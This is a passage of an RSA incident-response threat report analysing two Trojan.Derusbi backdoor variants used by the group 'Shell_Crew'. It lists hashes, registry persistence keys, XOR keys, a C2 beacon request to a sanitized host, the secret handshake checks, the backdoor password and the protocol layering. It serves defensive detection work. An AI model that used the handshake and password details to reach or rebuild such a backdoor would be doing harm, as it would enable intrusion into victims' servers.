@@ -1,0 +1,258 @@
+Malicious Files – Technical Analysis
+Page 17
+Shell_Crew uses a variety of malicious Trojans and tools to entrench themselves in a customer environment, however they
+consistently employ Trojans such as Trojan.Derusbi and variations of this Trojan family. This portion of the report will detail
+the technical analysis of two of the custom variations of Trojan.Derusbi used by Shell_Crew.
+1. Trojan.Derusbi
+The RSA IR Team has observed Shell_Crew deploy different variants of the Trojan.Derusbi family. This Trojan family
+provides attackers a backdoor into the enterprise, as well as functionality to locate and decrypt passwords stored on the
+system by web browsers like Firefox and Internet Explorer, gather system and network information, and upload or
+download files. Details of a sample found during a recent engagement involving Shell_Crew have been provided in Figure
+20.
+```
+          File Name: msressvkx.ttf
+      File Size: 141928 bytes
+
+      MD5:    c0d4c5b669cc5b51862db37e972d31ec
+
+      SHA1:    0beaa9038e9884bdda6b08c3737e7ee14894a6cf
+
+      PE Time:  0x4EAD4675 [Sun Oct 30 12:43:33 2011 UTC]
+
+      PEID Sig:  Microsoft Visual C++ v6.0 DLL
+
+      PEID Sig:  Microsoft Visual C++ v7.0 DLL
+
+      Sections (5):
+
+      Name   Entropy MD5
+
+      .text   6.4   ac994b0a4a872010d47652211eb789d8
+
+      .rdata  5.33   ca075b2352348728dc38d309d1a52499
+
+      .data   6.69   cdd5648583ab062550db0f1039700e28
+
+      .rsrc   2.89   463fc58dc7c103c564540cd1191f6c06
+
+      .reloc  6.03   7430b0b237db5acf3c691df23c915847
+
+```
+Figure 20: Details of the file 'msressvkx.ttf' - a Trojan.Derusbi variant
+It should be noted that the original sample contained a hard coded URL that made reference to a company name; because
+of this, the hard coded IP Address was replaced and the MD5 and SHA1 hash values provided above are for the sanitized
+file. This Trojan has an embedded and encoded driver file that is written to the infected system and then launched. This
+driver will hook the IP, TCP, UDP, and RawIP driver files that normally run on a system.
+When this particular Trojan.Derusbi variant is initially executed it checks to see if the registry key
+“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Security” is present in the registry. This registry key location is where
+the Trojan will store its encoded configuration data. If the key is not present on the system, the sample will first decode the
+configuration data that is embedded in the Trojan found at position 0x1EC88.
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 18
+Figure 21 below shows the function responsible for decoding this embedded data with the XOR key ‘0x 76 2D F2 41’. Once
+the configuration data has been initially decoded, it will be placed into memory and the Trojan will resolve the current
+machine name and append 4 characters of pseudorandom data separated by a dash “-“. This null terminated string will
+then overwrite the first portion of data in the decoded configuration file.
+Figure 21: Trojan.Derusbi Configuration Data Decoding Function
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 19
+The data below in Figure 22 illustrates the decoded configuration data. The machine name string and the hard coded
+C2 for this sample are highlighted in yellow (and have been changed to protect the victim).
+Figure 22: Decoded Trojan.Derusbi configuration data
+This machine specific configuration data will then be encoded, using a different method, where each byte is XORed with
+0x5F and then each bit of that product byte is subsequently inverted. This encoded data will then be written to the
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Security registry key. Figure 23 below shows the function within the
+Trojan responsible for encoding this data and then writing it to the registry. If the sample is restarted it will again check for
+the registry value containing the configuration data. If this value is located, the sample will read the configuration data and
+then decode it using a function similar to the function that is depicted below.
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 20
+Figure 23: Trojan.Derusbi Configuration Data Encoding Function
+Upon initial execution, the Trojan will decode, write, and launch a driver file that is embedded in the file at offset 0x19A40.
+The data shown below in Figure 24 is how the data resides in the file.
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 21
+As shown in Figure 24, the first DWORD that is highlighted in yellow is the 4 byte XOR key that is used to decode the driver
+file. It should be noted that this XOR key is the same in several variants that were compiled over a year time frame. The
+second DWORD highlighted in blue is the length of data to be decoded (the size of the driver file) 0x52 18 or 21,016 bytes
+decimal.
+Figure 24: XOR key that is used to decode the driver file
+The function below in Figure 25 is responsible for decoding the driver file. This function will call an additional function that
+is responsible for writing the decoded data to disk as ‘C:\Windows\System32\Drivers{6AB5E732-DFA9-4618-AF1CF0D9DEF0E222}.sys’. The Trojan will then use the API call ZwLoadDriver to start the newly created file.
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 22
+Figure 25: Trojan.Derusbi Driver Decoding Function
+The driver will hook other networking drivers and will determine if incoming traffic contains certain patterns of traffic,
+which when specific conditions are met will pipe that traffic to Trojan.Derusbi. Once the Trojan begins to communicate with
+the hard coded C2, it will initially transmit the following POST request shown in Figure 26.
+```
+                  POST /forum/login.cgi HTTP/1.1
+              HOST: bad.malwarejwm.com:443
+
+              User-Agent: Mozilla/4.0
+
+              Proxy-Connection: Keep-Alive
+
+              Connection: Keep-Alive
+
+              Pragma: no-cache
+
+```
+Figure 26: POST request initiated by Trojan.Derusbi
+If no response is received it will transmit the following binary data shown in Figure 27, which is part of a proprietary
+handshake that is discussed more in the Trojan.Derusbi – Server Variant section. The Binary data contains a set of three
+DWORDs that the C2 will validate to as part of the initial portion of the handshake. The first DWORD is created just prior to
+the beaconing activity. The following two DWORDs are mathematical modifications of the first DWORD.
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 23
+Figure 27: Binary data transmitted by Trojan.Derusbi
+As illustrated below in Figure 28, the second DWORD is the product of XORing the first DWORD with 0xFF. The third
+DWORD is the product of rotating the first DWORD value right by 7.
+Figure 28: The Binary data contains a set of three DWORDs
+If the Trojan does not receive the other necessary portions of the Trojan/C2 handshake it will transmit the following type of
+GET request. The ‘loginid’ that is highlighted in yellow in Figure 29 is created pseudorandomly.
+Figure 29: GET request transmitted by the Trojan
+This Trojan has several advanced capabilities including providing a reverse shell to the adversary, locating and decrypting
+usernames and passwords stored by web browsers like Internet Explorer and Firefox, uploading and downloading files, and
+executing additional malicious files.
+Appendix 1 of this report illustrates how several variants of Trojan.Derusbi have overlapping characteristics. Having the
+ability to quickly detect relationships between different variants allows the RSA IR Team to locate not just specific samples,
+but variants throughout an environment within the same family.
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+2. Trojan.Derusbi Server Variant
+Page 24
+Shell_crew deployed this variant of Trojan.Derusbi on perimeter devices in a victim’s network. This variant contains a driver
+that monitors all incoming TCP connections for a secret handshake. The handshake is simple enough to allow this variant to
+function even on busy web servers. Once the handshake is received, the driver then passes control to the DLL file which
+contains the main functionality of the Trojan. Characteristics of one such Trojan.Derusbi server variant can be found in
+Figure 30.
+```
+         File Name: 2.dll
+     File Size: 65816 bytes
+
+     MD5:    7c32302791501d817fe9ecb589ecc026
+
+     SHA1:    e473e936374aed2701c9455b487cdf2cbec30cf8
+
+     PE Time:  0x4FE740F9 [Sun Jun 24 16:31:53 2012 UTC]
+
+     PEID Sig:  Microsoft Visual C++ v6.0 DLL
+
+     PEID Sig:  Microsoft Visual C++ v7.0 DLL
+
+     Sections (5):
+
+     Name   Entropy MD5
+
+     .text   6.22   f8a33e42f67dc9ea82e50698556c2e19
+
+     .rdata  4.95   f795dbaabc5a4dc86780a02c7fb9bbd0
+
+     .data   7.07   5085436ae0b2d8977b4034aae2d98ad6
+
+     .rsrc   2.88   b69e32f439cc4bd33e4dd5ea23bfe02b
+
+     .reloc  5.39   5e891a6fb9398ffed88fda988ee49422
+
+      .rsrc   2.89   463fc58dc7c103c564540cd1191f6c06
+
+      .reloc  6.03   7430b0b237db5acf3c691df23c915847
+
+```
+Figure 30: Characteristics of the file 2.dll - a Trojan.Derusbi variant
+The Trojan exports the functions shown in Table 2 below.
+|Entry Point|Ordinal|Name|
+|---|---|---|
+|100067FBh|1|DllRegisterServer|
+|10006777h|2|DllUnregisterServer|
+|10004CFFh|3|ServiceMain|
+|10004CF0h|4|SvchostPushServiceGlobals|
+|10004FAAh|5|WUServiceMain|
+|10007223h|6|_crt_debugger_hook|
+Table 2: Trojan.Dersubi server variant functions
+The adversary installed this Trojan by utilizing the regsvr32.exe utility, which calls the DllRegisterServer function. This Trojan
+first checks the version of Windows it is running on using the GetVersionExA function, and will terminate if not on a
+Windows version 5.2 as shown in Figure 31.
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 25
+Figure 31: Derusbi server variant - check OS version logic
+This versions of Windows this covers is:
+- Windows 2003 Server;
+
+- Windows 2003 Server R2; and
+
+- Windows XP 64-bit Edition.
+
+The Trojan then validates that it is not running on a 64-bit system by using the IsWow64Process function. The servers
+where this Trojan was found during the engagement were Windows 2003 servers, confirming the Shell_Crew had created
+this variant of the Trojan.Derusbi to run specifically on this family of Operating Systems. The Trojan then makes a copy of
+itself into the C:\Windows\System32 folder as a file named: “msusbXXX.hlp”, where XXX were found to be three characters
+picked randomly from this set of characters: abcdefghijklmnopqrstuvwxyz.
+The Trojan then entrenches itself as a service named “wuauserv” as illustrated in Figure 32.
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv\Parameters  ServiceDLL:
+```
+  %Systemroot%\System32\msusbfmg.hlp
+```
+Figure 32: Registry key identifying the service name and Trojan file
+Furthermore, this Trojan also drops a driver file on the system named: {93144EB0-8E3E-4591-B307-8EEBFE7DB28F}.sys.
+This driver file is embedded into the DLL starting at file-offset 0x9290. The contents of this file are obfuscated with a 4-byte
+XOR key: 0xF35D882E.
+Once the driver file is loaded in memory, the file is deleted from the file system. The following registry key remains as an
+artifact: HKLM\SYSTEM\CURRENTCONTROLSET\ENUM\ROOT\LEGACY_{93144EB0-8E3E-4591-B307-8EEBFE7DB28F} . The
+driver also attaches to the following network devices:
+- \Driver\Tcpip\Device\Ip;
+
+- \Driver\Tcpip\Device\Tcp;
+
+- \Driver\Tcpip\Device\Udp; and
+
+- \Driver\Tcpip\Device\RawIp.
+
+The driver can then monitor traffic to any existing listening TCP ports. The driver performs the following three checks on
+any new TCP connections:
+- Ensures the payload of the first packet equals 64 bytes;
+
+- Ensures 2nd DWORD = Inverted 1st DWORD (i.e. logical NOT, or XOR 0xFF); and
+
+- Ensures 1st DWORD ROR 7 = 3rd DWORD.
+
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 26
+Figure 33: Driver logic that looks for handshake
+All the data in the handshake is randomly generated. Other than the first three DWORDS (12 bytes), the rest of the data in
+the 64-byte handshake is irrelevant. The structure of the handshake is shown below in Figure 34:
+Figure 34: Trojan.Derusbi server variant handshake structure
+The malicious DLL performs the last two checks on the handshake data as well. It then replies back with the same type of
+handshake. All data is randomly generated independent of what data was received. Figure 35 depicts a sample handshake.
+Figure 35: Trojan.Derusbi server variant handshake sample data
+The handshake is followed by a password verification step. The structure of the data also changes from this point forward.
+This sample uses password, “pinkcomein”. The client Trojan service sends the password after obfuscating it with a 4-byte
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
+Page 27
+XOR key, which is dynamically generated and sent with the rest of the data. The checksum is a simple addition of all the
+bytes prior to the obfuscation step.
+Figure 36: Trojan.Derusbi server variant - authentication
+Once the password has been confirmed, the communication protocol adds one additional component. All data beyond the
+headers is compressed using the LZO [3] fast compression algorithm, prior to being obfuscated with the 4-byte XOR key. The
+commands sent to the server also need to be compressed and obfuscated. Figure 37 shows an example that demonstrates
+all these components of the communication protocol (XOR key in this example was set to 0x00000000 to expose the next
+layer for demonstration purposes).
+Figure 37: Trojan.Derusbi server variant – protocol components
+The commands are in binary form. In the example shown in Figure 37, the command is 0x10 (which is visible even though
+the data is compressed), uninstalls the Trojan, and restores the original registry keys. The rest of the functionality of this
+Trojan is typical to this family of Trojans including; file traversal, process start/terminate, upload/download, time
+stomping, and self-updates.
+3
+http://www.codingnow.com/windsoul/package/lzoc.htm
+RSA Emerging Threat Profile: Shell_Crew
+RSA Incident Response
